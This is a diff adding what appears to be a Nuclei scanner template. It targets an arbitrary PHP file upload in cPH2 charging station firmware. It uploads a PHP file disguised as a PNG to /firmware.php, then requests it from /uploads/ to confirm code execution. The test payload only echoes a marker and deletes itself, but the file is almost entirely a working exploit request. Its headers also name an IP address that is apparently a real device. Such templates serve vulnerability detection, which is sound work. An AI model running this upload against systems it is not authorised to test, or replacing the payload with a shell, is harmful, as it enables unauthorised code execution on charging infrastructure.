@@ -1,0 +1,60 @@
+id: cPH2-Charging-Station-firmware-upload
+info:
+  name: cPH2-Charging-Station-firmware-upload
+  author: lemonlove7
+  severity: critical
+flow: http(1) && http(2)
+http:
+  - raw:
+      - |-
+        POST /firmware.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 229
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiA3orBbA5D89Twoh
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
+        Origin: http://217.248.180.159
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Referer: http://217.248.180.159/firmware.php
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+        
+        ------WebKitFormBoundaryiA3orBbA5D89Twoh
+        Content-Disposition: form-data; name="media"; filename="tes1111.php"
+        Content-Type: image/png
+        
+        <?php echo 'qaxtest123'; unlink(__FILE__); ?>
+        ------WebKitFormBoundaryiA3orBbA5D89Twoh--
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        part: body
+        words:
+          - 'successfully'
+        internal: true
+    matchers-condition: and
+  - raw:
+      - |-
+        GET /uploads/tes1111.php HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'qaxtest123'
+    matchers-condition: and
